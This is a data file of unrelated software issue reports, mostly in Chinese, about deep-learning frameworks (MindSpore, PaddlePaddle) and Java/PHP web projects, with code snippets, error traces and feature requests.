[CT][MS][OP]Dynamic shape op softsign report accuracy error,": Ascend /device ascend : -- MindSpore version : -- Python version :3.7.5 -- OS platform and distribution : -- GCC/Compiler version : 执行测试用例 ascend环境上图模式下执行测试用例， 有精度误差，pynative下没问题 用例执行结果没有精度误差   <code>: def test_dynamic_shape_softsign_4d_float32(): input_np = np.random.randn(8, 8, 8, 8).astype(np.float32) indices_np = np.random.randint(0, 8, size=8) fact = SoftsignDynamicShapeFactory(input_np, indices_np, loss=0.0001) fact.forward_cmp() def test_dynamic_shape_softsign_4d_float32(): input_np = np.random.randn(8, 8, 8, 8).astype(np.float32) indices_np = np.random.randint(0, 8, size=8) fact = SoftsignDynamicShapeFactory(input_np, indices_np, loss=0.0001) &gt; fact.forward_cmp() test_dynamic_shape_softsign.py:82: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ test_dynamic_shape_softsign.py:54: in forward_cmp allclose_nparray(out_tensorflow, out_ms.asnumpy(), self.loss, self.loss) ../share/utils.py:30: in allclose_nparray _count_unequal_element(data_expected, data_me, rtol, atol) _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ data_expected = array([[[[-0.23241113, -0.368746 , -0.5848821 , ..., 0.49732867, 0.20305637, 0.5087308 ], [ 0.4... [ 0.51777935, -0.27531287, -0.2472496 , ..., -0.44689703, -0.495482 , 0.62564075]]]], dtype=float32) data_me = array([[[[-0.23240788, -0.3685155 , -0.584771 , ..., 0.4966181 , 0.20303887, 0.5086705 ], [ 0.4... [ 0.5179954 , -0.27528334, -0.24698775, ..., -0.4465992 , -0.4948812 , 0.6267116 ]]]], dtype=float32) rtol = 0.0001, atol = 0.0001 def _count_unequal_element(data_expected, data_me, rtol, atol): assert data_expected.shape == data_me.shape total_count = len(data_expected.flatten()) error = np.abs(data_expected - data_me) greater = np.greater(error, atol + np.abs(data_me) * rtol) loss_count = np.count_nonzero(greater) assert (loss_count / total_count) &lt; rtol, \ ""\ndata_expected_std:{0}\ndata_me_error:{1}\nloss:{2}"". \ &gt; format(data_expected[greater], data_me[greater], error[greater]) E AssertionError: E data_expected_std:[-0.368746 0.17452349 -0.23797227 ... -0.44689703 -0.495482 E 0.62564075] E data_me_error:[-0.3685155 0.17425756 -0.23848574 ... -0.4465992 -0.4948812 E 0.6267116 ] E loss:[0.00023052 0.00026593 0.00051346 ... 0.00029784 0.00060079 0.00107086]"
希望 TreeUtil 能加入节点搜索,"JDK版本： jdk_8_131 hutool版本： 5.7.17 希望 TreeUtil 能加入节点搜索，并且能把过滤的函数开放出来，能找到满足要求的节点及其树结构 代码示例 期望的结果如下   <code>: // 树结构如下 ├─cJSON │ └─tests └─MACOSX └─cJSON └─tests └─tecccs └─cJSON2 └─aaaa3 //找寻包含test字符串的节点对应的树结构 TreeUtil.build(list,pid,config,filter) ├─cJSON │ └─tests └─MACOSX └─cJSON └─tests"
分布式模型并行推理，model不能正确加载ckpt参数，导致使用初始参数进行推理,"version：mindspore-ascend 1.6.1 使用semi模式进行分布式训练后，在每个device上保存了分片的ckpt文件。 我根据官网提供的代码示例，进行模型加载后推理，model不能正确加载ckpt参数，导致使用初始参数进行推理 模型定义： 分布式推理：   <code>: def model_fn(config): context.set_auto_parallel_context(full_batch=True, enable_parallel_optimizer=False, parallel_mode='semi_auto_parallel', strategy_ckpt_load_file='train_strategy.ckpt', device_num=config.rayce_config.devices) net = Rayce(config.rayce_config) total_params = 0 for param in net.trainable_params(): total_params += np.prod(param.shape) if not get_rank(): print(""Total params: %d"" % total_params) print(""Total NPU: %s"" % get_group_size()) return net def score_fn(data, net, config): """"""Evaluating Model with input dataset"""""" model = Model(net) ckpt_file_list = create_ckpt_file_list(config) predict_strategy = model.infer_predict_layout(next(data.create_dict_iterator())['map']) load_distributed_checkpoint(net, ckpt_file_list, predict_strategy) for sample in data.create_dict_iterator(): y_pred = model.predict(sample['map']).astype(""float32"").asnumpy() ..."
"使用paddle inference demo,发现python 预测api会占满显存，但是c++ api只占用500m显存。","1）PaddlePaddle版本：在docker-dev中自己编译的1.8.4 2）GPU：gtx1060 3）系统环境：ubuntu18.04,python3.7 4）预测库来源：in docker latest-dev-cuda10.1-cudnn7-gcc82,正常编译 复现信息： 使用https://github.com/PaddlePaddle/Paddle-Inference-Demo 中的代码，加了循环持续运行，c++和python都正常运行，但是python占用显存数倍于c++，python代码如下 C++代码： 问题描述：使用python预测库占用显存过高   <code>: import numpy as np import argparse import cv2 import time from PIL import Image from paddle.fluid.core import AnalysisConfig from paddle.fluid.core import create_paddle_predictor from utils import preprocess, draw_bbox def create_predictor(args): config = AnalysisConfig(args.model_file, args.params_file) config.switch_use_feed_fetch_ops(False) config.enable_memory_optim() config.enable_tensorrt_engine( max_batch_size=1, min_subgraph_size=5, precision_mode=AnalysisConfig.Precision.Half, use_static=True, use_calib_mode=False) if args.use_gpu: config.enable_use_gpu(200, 0) else: # If not specific mkldnn, you can set the blas thread. # The thread num should not be greater than the number of cores in the CPU. config.set_cpu_math_library_num_threads(4) #config.enable_mkldnn() predictor = create_paddle_predictor(config) return predictor def run(predictor, img): # copy img data to input tensor input_names = predictor.get_input_names() for i, name in enumerate(input_names): input_tensor = predictor.get_input_tensor(name) input_tensor.reshape(img[i].shape) input_tensor.copy_from_cpu(img[i].copy()) # do the inference predictor.zero_copy_run() results = [] # get out data from output tensor output_names = predictor.get_output_names() for i, name in enumerate(output_names): output_tensor = predictor.get_output_tensor(name) output_data = output_tensor.copy_to_cpu() results.append(output_data) return results def parse_args(): parser = argparse.ArgumentParser() parser.add_argument(""--model_file"", type=str, default=""model/__model__"", help=""Model filename, Specify this when your model is a combined model."") parser.add_argument(""--params_file"", type=str, default=""model/__params__"", help=""Parameter filename, Specify this when your model is a combined model."") parser.add_argument(""--use_gpu"", type=int, default=1, help=""Whether use gpu."") return parser.parse_args() if __name__ == '__main__': args = parse_args() img_name = '1.jpg' save_img_name = 'res.jpg' im_size = 608 pred = create_predictor(args) img = cv2.imread(img_name) data = preprocess(img, im_size) im_shape = np.array([im_size, im_size]).reshape((1,2)).astype(np.int32) i = 1 while(1): a=time.time() result = run(pred, [data, im_shape]) b = time.time() print(b-a) print(i) i = i+1 #include ""paddle/include/paddle_inference_api.h"" #include &lt;numeric&gt; #include &lt;iostream&gt; #include &lt;memory&gt; #include &lt;chrono&gt; #include &lt;ctime&gt; #include &lt;gflags/gflags.h&gt; #include &lt;glog/logging.h&gt; using paddle::AnalysisConfig; using namespace std; clock_t startc,endc; DEFINE_string(model_file, ""model/__model__"", ""Directory of the inference model.""); DEFINE_string(params_file, ""model/__params__"", ""Directory of the inference model.""); DEFINE_int32(batch_size, 1, ""Directory of the inference model.""); DEFINE_bool(use_gpu, true, ""enable gpu""); DEFINE_bool(use_mkldnn, true, ""enable mkldnn""); DEFINE_bool(mem_optim, true, ""enable memory optimize""); using Time = decltype(std::chrono::high_resolution_clock::now()); Time time() { return std::chrono::high_resolution_clock::now(); }; double time_diff(Time t1, Time t2) { typedef std::chrono::microseconds ms; auto diff = t2 - t1; ms counter = std::chrono::duration_cast&lt;ms&gt;(diff); return counter.count() / 1000.0; } std::unique_ptr&lt;paddle::PaddlePredictor&gt; CreatePredictor() { AnalysisConfig config; config.SetModel(FLAGS_model_file, FLAGS_params_file); if (FLAGS_use_gpu) { config.EnableUseGpu(100, 0); } if (FLAGS_use_mkldnn) { config.EnableMKLDNN(); } // Open the memory optim. if (FLAGS_mem_optim) { config.EnableMemoryOptim(); } // We use ZeroCopy, so we set config-&gt;SwitchUseFeedFetchOps(false) config.SwitchUseFeedFetchOps(false); return CreatePaddlePredictor(config); } void run(paddle::PaddlePredictor *predictor, const std::vector&lt;float&gt;&amp; input, const std::vector&lt;int&gt;&amp; input_shape, const std::vector&lt;int&gt;&amp; input_im, const std::vector&lt;int&gt;&amp; input_im_shape, std::vector&lt;float&gt; *out_data) { auto input_names = predictor-&gt;GetInputNames(); auto input_img = predictor-&gt;GetInputTensor(input_names[0]); input_img-&gt;Reshape(input_shape); input_img-&gt;copy_from_cpu(input.data()); auto input_size = predictor-&gt;GetInputTensor(input_names[1]); input_size-&gt;Reshape(input_im_shape); input_size-&gt;copy_from_cpu(input_im.data()); CHECK(predictor-&gt;ZeroCopyRun()); auto output_names = predictor-&gt;GetOutputNames(); // there is only one output of yolov3 auto output_t = predictor-&gt;GetOutputTensor(output_names[0]); std::vector&lt;int&gt; output_shape = output_t-&gt;shape(); int out_num = std::accumulate(output_shape.begin(), output_shape.end(), 1, std::multiplies&lt;int&gt;()); out_data-&gt;resize(out_num); output_t-&gt;copy_to_cpu(out_data-&gt;data()); } int main(int argc, char* argv[]) { google::ParseCommandLineFlags(&amp;argc, &amp;argv, true); auto predictor = CreatePredictor(); const int height = 608; const int width = 608; const int channels = 3; std::vector&lt;int&gt; input_shape = {FLAGS_batch_size, channels, height, width}; std::vector&lt;float&gt; input_data(FLAGS_batch_size * channels * height * width, 0); for (size_t i = 0; i &lt; input_data.size(); ++i) { input_data[i] = i % 255 * 0.13f; } std::vector&lt;int&gt; input_im_shape = {FLAGS_batch_size, 2}; std::vector&lt;int&gt; input_im_data(FLAGS_batch_size * 2, 608); std::vector&lt;float&gt; out_data; while(1){ startc=clock(); run(predictor.get(), input_data, input_shape, input_im_data, input_im_shape, &amp;out_data); LOG(INFO) &lt;&lt; ""output num is "" &lt;&lt; out_data.size(); endc=clock(); double endtime=(double)(endc-startc)/CLOCKS_PER_SEC; cout&lt;&lt;""Total time:""&lt;&lt;endtime*1000&lt;&lt;""ms""&lt;&lt;std::endl; } return 0; }"
gpu kernel op failed (split op),"/device gpu : -- MindSpore version : 1.5.0 (pip install) -- Python version : 3.7.5 -- OS platform and distribution : Linux Ubuntu 18.04.5 LTS (Bionic Beaver) -- GCC/Compiler version : - Clone that repo ""seresnext_gpu"" branch. It's just fork of mindspore-models master branch with several changings. Download the ImageNet dataset and specify the path to it in the train/val directories in the corresponding fields of the gpu configuration file Change directory to /models/research/cv/SE_ResNeXt50/scripts Launch training with following command: (requires 8 gpu) Script fails with following Runtime error: RuntimeError: mindspore/ccsrc/runtime/device/gpu/gpu_kernel_build.cc:64 CreateGPUKernel] Initialize gpu kernel op[Default/network-TrainOneStepCell/network-WithLossCell/_backbone-SENet/layer2-SequentialCell/1-SEResNeXtBottleneck/conv2-GroupConv/Split-op66838] failed. Script works and training starts~ It also prints that error: I'm tried to change ""output_num"" param to make it less than 28, but each time I change it - it change error message and it always has form ""Attr output_num &lt;my value&gt;must less than&lt;some value that less than my&gt;""   <code>: ./run_distribution_train_gpu.sh ../config/resnext50_imagenet_gpu.yaml # Traceback (most recent call last): File ""train.py"", line 156, in &lt;module&gt; model.train(cfg.epoch_size, dataset, callbacks=cbs) File ""/root/anaconda3/lib/python3.7/site-packages/mindspore/train/model.py"", line 726, in train sink_size=sink_size) File ""/root/anaconda3/lib/python3.7/site-packages/mindspore/train/model.py"", line 504, in _train self._train_dataset_sink_process(epoch, train_dataset, list_callback, cb_params, sink_size) File ""/root/anaconda3/lib/python3.7/site-packages/mindspore/train/model.py"", line 566, in _train_dataset_sink_process outputs = self._train_network(*inputs) File ""/root/anaconda3/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 404, in __call__ out = self.compile_and_run(*inputs) File ""/root/anaconda3/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 682, in compile_and_run self.compile(*inputs) File ""/root/anaconda3/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 669, in compile _cell_graph_executor.compile(self, *inputs, phase=self.phase, auto_parallel_mode=self._auto_parallel_mode) File ""/root/anaconda3/lib/python3.7/site-packages/mindspore/common/api.py"", line 548, in compile result = self._graph_executor.compile(obj, args_list, phase, use_vm, self.queue_name) RuntimeError: mindspore/ccsrc/runtime/device/gpu/gpu_kernel_build.cc:64 CreateGPUKernel] Initialize gpu kernel op[Default/network-TrainOneStepCell/network-WithLossCell/_backbone-SENet/layer2-SequentialCell/1-SEResNeXtBottleneck/conv2-GroupConv/Split-op66838] failed. [ERROR] KERNEL(11414,7f0c24b78740,python):2022-01-15-08:05:01.730.814 [mindspore/ccsrc/backend/kernel_compiler/gpu/arrays/split_gpu_kernel.h:160] CheckParam] Attr output_num 32must less than28"
selectByExample 可以支持分页吗？,"使用以下代码查询会报错： 报错如下： 单独使用 则能正常查询   <code>: PageHelper.startPage(pageNum, pageSize); mapper.selectByExample(example); org.mybatis.spring.MyBatisSystemException: nested exception is org.apache.ibatis.builder.BuilderException: Error invoking SqlProvider method (com.github.abel533.mapper.MapperProvider.dynamicSQL). Cause: java.lang.InstantiationException: com.github.abel533.mapper.MapperProvider mapper.selectByExample(example);"
" Cublas error, CUBLAS_STATUS_EXECUTION_FAILED","” 1）PaddlePaddle版本：1.8.1 2）CPU：/ 3）GPU：V100 Driver Version: 418.39 CUDA Version: 10.1 训练信息 1）单机单卡 3）Operator信息：operator &lt; mul &gt; error fluid.install_check()没有问题，但是在训练时出core   <code>: terminate called after throwing an instance of 'paddle::platform::EnforceNotMet' what(): -------------------------------------------- C++ Call Stacks (More useful to developers): -------------------------------------------- 0 std::string paddle::platform::GetTraceBackString&lt;char const*&gt;(char const*&amp;&amp;, char const*, int) 1 paddle::platform::EnforceNotMet::EnforceNotMet(std::__exception_ptr::exception_ptr, char const*, int) 2 void paddle::operators::math::Blas&lt;paddle::platform::CUDADeviceContext&gt;::MatMul&lt;float&gt;(paddle::framework::Tensor const&amp;, bool, paddle::framework::Tensor const&amp;, bool, float, paddle::framework::Tensor*, float) const 3 paddle::operators::MulKernel&lt;paddle::platform::CUDADeviceContext, float&gt;::Compute(paddle::framework::ExecutionContext const&amp;) const 4 std::_Function_handler&lt;void (paddle::framework::ExecutionContext const&amp;), paddle::framework::OpKernelRegistrarFunctor&lt;paddle::platform::CUDAPlace, false, 0ul, paddle::operators::MulKernel&lt;paddle::platform::CUDADeviceContext, float&gt;, paddle::operators::MulKernel&lt;paddle::platform::CUDADeviceContext, double&gt;, paddle::operators::MulKernel&lt;paddle::platform::CUDADeviceContext, paddle::platform::float16&gt; &gt;::operator()(char const*, char const*, int) const::{lambda(paddle::framework::ExecutionContext const&amp;)#1}&gt;::_M_invoke(std::_Any_data const&amp;, paddle::framework::ExecutionContext const&amp;) 5 paddle::framework::OperatorWithKernel::RunImpl(paddle::framework::Scope const&amp;, paddle::platform::Place const&amp;, paddle::framework::RuntimeContext*) const 6 paddle::framework::OperatorWithKernel::RunImpl(paddle::framework::Scope const&amp;, paddle::platform::Place const&amp;) const 7 paddle::framework::OperatorBase::Run(paddle::framework::Scope const&amp;, paddle::platform::Place const&amp;) 8 paddle::framework::HogwildWorker::TrainFilesWithProfiler() ------------------------------------------ Python Call Stacks (More useful to users): ------------------------------------------ File ""/home/users/wangjiawei04/paddle_release_home/python/lib64/python2.7/site-packages/paddle/fluid/framework.py"", line 2610, in append_op attrs=kwargs.get(""attrs"", None)) File ""/home/users/wangjiawei04/paddle_release_home/python/lib64/python2.7/site-packages/paddle/fluid/layer_helper.py"", line 43, in append_op return self.main_program.current_block().append_op(*args, **kwargs) File ""/home/users/wangjiawei04/paddle_release_home/python/lib64/python2.7/site-packages/paddle/fluid/layers/nn.py"", line 1719, in fc ""y_num_col_dims"": 1}) File ""/home/users/wangjiawei04/chengmo/paddle_attention/paddle/train_net.py"", line 639, in fusion_semantic_word bias_attr=fluid.ParamAttr(name=""tdm.cls_fc.bias"")) File ""/home/users/wangjiawei04/chengmo/paddle_attention/paddle/train_net.py"", line 237, in train_net semantic_states, word_states) File ""/home/users/wangjiawei04/chengmo/paddle_attention/paddle/local_train.py"", line 96, in run_train avg_cost, auc = tdm_model.train_net(inputs) File ""/home/users/wangjiawei04/chengmo/paddle_attention/paddle/local_train.py"", line 209, in main run_train(args) File ""/home/users/wangjiawei04/chengmo/paddle_attention/paddle/local_train.py"", line 216, in &lt;module&gt; main(args) ---------------------- Error Message Summary: ---------------------- ExternalError: Cublas error, CUBLAS_STATUS_EXECUTION_FAILED at (/paddle/paddle/fluid/operators/math/blas_impl.cu.h:34) [operator &lt; mul &gt; error] W0528 13:54:15.679564 213705 init.cc:216] Warning: PaddlePaddle catches a failure signal, it may not work properly W0528 13:54:15.679577 213705 init.cc:218] You could check whether you killed PaddlePaddle thread/process accidentally or report the case to PaddlePaddle W0528 13:54:15.679581 213705 init.cc:221] The detail failure signal is: W0528 13:54:15.679586 213705 init.cc:224] *** Aborted at 1590645255 (unix time) try ""date -d @1590645255"" if you are using GNU date *** W0528 13:54:15.684528 213705 init.cc:224] PC: @ 0x0 (unknown) W0528 13:54:15.684717 213705 init.cc:224] *** SIGABRT (@0x520520002dd8f) received by PID 187791 (TID 0x7f609d7cc700) from PID 187791; stack trace: *** W0528 13:54:15.685890 213705 init.cc:224] @ 0x7f60ca1c8160 (unknown) W0528 13:54:15.687609 213705 init.cc:224] @ 0x7f60c97363f7 __GI_raise W0528 13:54:15.688812 213705 init.cc:224] @ 0x7f60c97377d8 __GI_abort W0528 13:54:15.690255 213705 init.cc:224] @ 0x7f5feba34c65 __gnu_cxx::__verbose_terminate_handler() W0528 13:54:15.690800 213705 init.cc:224] @ 0x7f5feba32e06 __cxxabiv1::__terminate() W0528 13:54:15.691521 213705 init.cc:224] @ 0x7f5feba32e33 std::terminate() W0528 13:54:15.692054 213705 init.cc:224] @ 0x7f5feba85935 execute_native_thread_routine W0528 13:54:15.693186 213705 init.cc:224] @ 0x7f60ca1c01c3 start_thread W0528 13:54:15.694511 213705 init.cc:224] @ 0x7f60c97e812d __clone W0528 13:54:15.695627 213705 init.cc:224] @ 0x0 (unknown) I0528 13:54:15.863662 213708 mmap_allocator.cc:124] PID: 213708, MemoryMapFdSet: set size - 0"
WebApi接口返回数据包中能独立显示错误代码,"Furion 版本号 v1.14.0 Web 项目类型 WebApi Mvc Razor Pages Blazor Server 在调用类似代码抛出异常后，throw Oops.Oh(SystemErrorCodes.u1012)，客户端返回类似如下数据： 因500只能表示异常，但无法明确是哪种异常，能否将SystemErrorCodes.u1012对应的值显示到返回数据中，并根据需要设置不显示错误代码在errors中，如下所示： 同理成功的返回数据包类似如下：   <code>: { ""statusCode"": 500, ""data"": null, ""succeeded"": false, ""errors"": ""[u1012] 验证码已过期或不存在"", ""extras"": null, ""timestamp"": 1614060251716 } { ""statusCode"": 1012, ""data"": null, ""succeeded"": false, ""errors"": ""验证码已过期或不存在"", ""extras"": null, ""timestamp"": 1614060251716 } { ""statusCode"": 0, ""data"": null, ""succeeded"": true, ""errors"": null, ""extras"": null, ""timestamp"": 1614060251716 }"
fix compile errors in tensor,fix some compile errors in and add   <code>: tensor.h tensor_test.cc
【众智】【计算-AICPU开发】SparseSparseMaximum,"SparseSparseMaximum 1.1 功能介绍 稀疏算子，返回两个SparseTensors的元素最大值 1.2 接口描述 Python 层接口 接口目录：mindspore/ops/operations/sparse_ops.py class SparseSparseMaximum(Primitive): 1.3 异常处理 1.4 算子反向   <code>: REG_OP(SparseSparseMaximum) .INPUT(x1_indices, TensorType({DT_INT64})) .INPUT(x1_values, TensorType({DT_FLOAT, DT_FLOAT16, DT_INT8, DT_INT16, \ DT_UINT16, DT_UINT8, DT_INT32, DT_INT64, DT_DOUBLE})) .INPUT(x1_shape, TensorType({DT_INT64})) .INPUT(x2_indices, TensorType({DT_INT64})) .INPUT(x2_values, TensorType({DT_FLOAT, DT_FLOAT16, DT_INT8, DT_INT16, \ DT_UINT16, DT_UINT8, DT_INT32, DT_INT64, DT_DOUBLE})) .INPUT(x2_shape, TensorType({DT_INT64})) .OUTPUT(y_indices, TensorType({DT_INT64})) .OUTPUT(y_values, TensorType({DT_FLOAT, DT_FLOAT16, DT_INT8, DT_INT16, \ DT_UINT16, DT_UINT8, DT_INT32, DT_INT64, DT_DOUBLE})) .OP_END_FACTORY_REG(SparseSparseMaximum)"
[GraphKernel]Support GraphKernelFlags,"需求 支持细粒度控制图算融合过程，能根据不同网络做针对性调优 支持dump更多图算融合过程数据，用于问题分析定位和性能调优 GraphKernelFlags设计 格式 所有flags通过一个字符串一次性配置，格式如: 一个flag的格式是，key前有两个“--”，key和value用等号“=”号隔开，中间不能有空格或其它符号。如果是bool型的flag，也可以没有value（设了就默认代表true）。如果是list型的flag，则多个value之间用逗号“,”隔开。 多个flag之间用空格隔开，不能有逗号或其它符号！ 配置方法 通过context设置 在python脚本里可以通过设置字段。例如 注意要一次把想写的flags都写完，多次也只是最后一次设置的字符串会生效。 通过环境变量设置 通过设置环境变量设置flags。例如 通过环境变量控制的优先级比context更高，即如果设置了这个环境变量，则context里面设置的flags就会被忽略。通过这种方式可以达到不用对脚本做修改就能控制图算融合过程的目的。 <em>注：因为环境变量与API功能重复，mindspore推荐用户优先使用API（指context），我们将会在后续版本中删除此环境变量。</em> 通过flag控制图算融合开关 原先的context开关仍然保留，可以继续使用。 现在在flags里面也可以通过""opt_level""字段来设置，0表示关图算，非0表示开图算。目前仅支持0和1，更高level暂未支持。 如果flag和enable_graph_kernel都同时设置了图算开关，则以flag的为准。 所以现在控制图算融合开关的方式变成了：通过环境变量或context设置flag opt_level，或者通过context设置enable_graph_kernel。 支持的flag flag字段 功能描述 注意事项 opt_level int类型，控制图算融合优化等级，范围0-3，0表示关图算 无 dump_as_text bool类型，控制dump开关，默认关闭。如果打开，会在当前目录下生成一个""graph_kernel_dump""目录，保存各模块dump的内容 dump信息不会自动删除或覆盖，如果在同一个目录下运行脚本，下次会以追加的方式写入相同文件 enable_stitch_fusion bool类型，控制buffer stitch优化功能的开关，默认关闭 无 enable_parallel_fusion bool类型，控制并行融合优化功能的开关，默认关闭 无 enable_expand_ops string list类型，表示往默认列表里面加入新的expander算子。算子名大小写敏感 列表不要与disable_expand_ops的重合 disable_expand_ops string list类型，表示从默认expander列表里面删除某些算子。算子名大小写敏感 列表不要与enable_expand_ops的重合 enable_expand_ops_only string list类型，表示清空默认expander列表，只用这里设置的算子。算子名大小写敏感 设置这个flag的话会忽略enable_expand_ops和disable_expand_ops enable_cluster_ops string list类型，表示往默认列表里面加入新的cluster算子。算子名大小写敏感 列表不要与disable_cluster_ops的重合 disable_cluster_ops string list类型，表示从默认cluster列表里面删除某些算子。算子名大小写敏感 列表不要与enable_cluster_ops的重合 enable_cluster_ops_only string list类型，表示清空默认cluster列表，只用这里设置的算子。算子名大小写敏感 设置这个flag的话会忽略enable_cluster_ops和disable_cluster_ops 注：支持的flag会不断增加，通过文件 ""mindspore/ccsrc/utils/context/graph_kernel_flags.h"" 可查看最新的flag说明   <code>: ""--opt_level=1 --dump_as_text --enable_cluster_ops_only=Add,Mul,ReduceSum"" ""--key=value"" context.set_context graph_kernel_flags context.set_context(graph_kernel_flags=""--opt_level=1 --dump_as_text"") set_context MS_GRAPH_KERNEL_FLAGS export MS_GRAPH_KERNEL_FLAGS=""--opt_level=1 --dump_as_text"" enable_graph_kernel"
Wrong link to book chapters,"In the model page of English paddle website, There are several links that need to be fixed. under : The links to the Chinese version of document. Should be fixed to point to the English version Similar issue for under   <code>: please refer to PaddleBook Sentiment Analysis 4. Text classification Sentiment Analysis please refer to Recommended System 5. Learning to rank"
Python提供使用合并模型的接口吗？,"在C++中，可以使用这个即可加载合并模型，那么Python有么有这个接口呢？文档里没找到   <code>: // Read the binary configuration file generated by `convert_protobin.sh` long size; void* buf = read_config(CONFIG_BIN, &amp;size); // Create the gradient machine for inference. paddle_gradient_machine machine; CHECK(paddle_gradient_machine_create_for_inference(&amp;machine, buf, (int)size));"
主子表提交中visible:false问题：subdata.html,"在主子表提交的时候，子表字段赋值出现了一些问题，在设置 visible:false 后，子表的该列确实被隐藏，但是提交时，该列数据也为空了，有没有办法只是隐藏列，但提交时数据仍可以写到数据库中。   <code>: { field: 'name', align: 'center', title: '商品名称', visible:false, formatter: function(value, row, index) { value = ""西瓜""; var html = $.common.sprintf(""&lt;input class='form-control' type='text' name='goods[%s].name' value='%s'&gt;"", index, value); return html; } },"
ruoyi集成cxf启动报错,pom.xml里 新建了个config类 ... 13 common frames omitted   <code>: &lt;dependency&gt; &lt;groupId&gt;org.apache.cxf&lt;/groupId&gt; &lt;artifactId&gt;cxf-rt-frontend-jaxws&lt;/artifactId&gt; &lt;version&gt;3.1.12&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.cxf&lt;/groupId&gt; &lt;artifactId&gt;cxf-rt-transports-http&lt;/artifactId&gt; &lt;version&gt;3.1.12&lt;/version&gt; &lt;/dependency&gt;
[Speed] feature/ParallelExecutor,"fix https://github.com/PaddlePaddle/Paddle/issues/8592 Profiling result: script: as the example in this pr command: Setting copy weights forward and backward merge gradient apply gradient 1 with nccl on bp / 250 / 5 4 with nccl on bp / 750(AllReduce takes about 63%) / 5 Save Model (to be implemented) In the current implementation, the ParallelExecutor's constructor creates a base scope and <em>n</em> (<em>n</em> equals the number of GPUs) sub scopes, the model is replicated in each sub scope. The save model function cannot access the sub scopes created by the ParallelExecutor. Proposed Solution ParallelExecutor's constructor creates <em>n-1</em> sub scopes. will take a scope parameter, which will be attached as another sub scope. In this way, the user can create a scope, use it for as well as for save model.   <code>: CUDA_VISIBLE_DEVICES=0 nvprof -f -o one.nvvp python parallel_executor_example.py --batch_size=32 CUDA_VISIBLE_DEVICES=0,1,2,3 nvprof -f -o four.nvvp python parallel_executor_example.py --batch_size=32 ParallelExecutor.run ParallelExecutor.run"
模型分页传参错误,"https://gitee.com/ZhongBangKeJi/CRMEB/blob/master/crmeb/crmeb/traits/ModelTrait.php#L128 根据tp6的文档和源码 paginate方法只有2个参数 第一个参数是int或者数组 应该改为   <code>: $paginate = $model === null ? self::paginate($limit, false, ['query' =&gt; $params]) : $model-&gt;paginate($limit, false, ['query' =&gt; $params]); $paginate = $model === null ? self::paginate(['list_rows' =&gt; $limit, 'query' =&gt; $params], false) : $model-&gt;paginate(['list_rows' =&gt; $limit, 'query' =&gt; $params], false);"
项目无法初始化,执行 com.jeesite.test.InitCoreData 报错   <code>: org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'methodValidationPostProcessor' defined in class path resource [org/springframework/boot/autoconfigure/validation/ValidationAutoConfiguration.class]: Unsatisfied dependency expressed through method 'methodValidationPostProcessor' parameter 0; nested exception is org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'shiroFilter' defined in class path resource [com/jeesite/modules/config/ShiroConfig.class]: Unsatisfied dependency expressed through method 'shiroFilter' parameter 0; nested exception is org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'securityManager' defined in class path resource [com/jeesite/modules/config/ShiroConfig.class]: Unsatisfied dependency expressed through method 'securityManager' parameter 3; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'shiroCacheManager' defined in class path resource [com/jeesite/autoconfigure/core/CacheAutoConfiguration.class]: Bean instantiation via factory method failed; nested exception is org.springframework.beans.BeanInstantiationException: Failed to instantiate [com.jeesite.common.shiro.j.J]: Factory method 'shiroCacheManager' threw exception; nested exception is java.lang.NoClassDefFoundError: io/netty/channel/EventLoopGroup at org.springframework.beans.factory.support.ConstructorResolver.createArgumentArray(ConstructorResolver.java:733) at org.springframework.beans.factory.support.ConstructorResolver.instantiateUsingFactoryMethod(ConstructorResolver.java:475) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.instantiateUsingFactoryMethod(AbstractAutowireCapableBeanFactory.java:1246) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBeanInstance(AbstractAutowireCapableBeanFactory.java:1096) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:535) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:495) at org.springframework.beans.factory.support.AbstractBeanFactory.lambda$doGetBean$0(AbstractBeanFactory.java:317) at org.springframework.beans.factory.support.AbstractBeanFactory$$Lambda$147/291847739.getObject(Unknown Source) at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:222) at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:315) at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:204) at org.springframework.context.support.PostProcessorRegistrationDelegate.registerBeanPostProcessors(PostProcessorRegistrationDelegate.java:224) at org.springframework.context.support.AbstractApplicationContext.registerBeanPostProcessors(AbstractApplicationContext.java:708) at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:533) at org.springframework.boot.SpringApplication.refresh(SpringApplication.java:754) at org.springframework.boot.SpringApplication.refreshContext(SpringApplication.java:386) at org.springframework.boot.SpringApplication.run(SpringApplication.java:307) at org.springframework.boot.test.context.SpringBootContextLoader.loadContext(SpringBootContextLoader.java:127) at org.springframework.test.context.cache.DefaultCacheAwareContextLoaderDelegate.loadContextInternal(DefaultCacheAwareContextLoaderDelegate.java:99) at org.springframework.test.context.cache.DefaultCacheAwareContextLoaderDelegate.loadContext(DefaultCacheAwareContextLoaderDelegate.java:117) at org.springframework.test.context.support.DefaultTestContext.getApplicationContext(DefaultTestContext.java:108) at org.springframework.test.context.web.ServletTestExecutionListener.setUpRequestContextIfNecessary(ServletTestExecutionListener.java:190) at 